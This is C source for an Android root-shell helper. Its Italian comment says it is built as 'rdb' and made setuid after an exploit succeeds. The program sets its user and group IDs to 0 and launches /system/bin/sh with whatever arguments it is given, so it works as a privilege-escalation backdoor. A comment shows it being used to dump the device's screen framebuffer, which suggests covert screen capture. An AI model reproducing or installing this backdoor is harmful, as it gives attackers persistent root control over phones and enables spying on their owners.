#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/time.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <math.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/system_properties.h>
#include <errno.h>
#include <jni.h>
#include <android/log.h>

#define LOG(x)  printf(x)

// questo file viene compilato come rdb e quando l'exploit funziona viene suiddato

// statuslog -c "/system/bin/cat /dev/graphics/fb0"
int main(int argc, char** argv) {
	seteuid(0);
	setegid(0);
	setuid(0);
	setgid(0);

	char buf[128];
	sprintf(buf, "Exploit Status: EUID: %d, UID: %d\n", geteuid(), getuid());
	LOG(buf);

	const char * shell = "/system/bin/sh";
	LOG("Starting shell\n");

	char *exec_args[argc + 1];
	exec_args[argc] = NULL;
	exec_args[0] = "sh";
	int i;
	for (i = 1; i < argc; i++) {
		exec_args[i] = argv[i];
	}
	execv("/system/bin/sh", exec_args);

	LOG("Exiting shell\n");

	return 0;
}
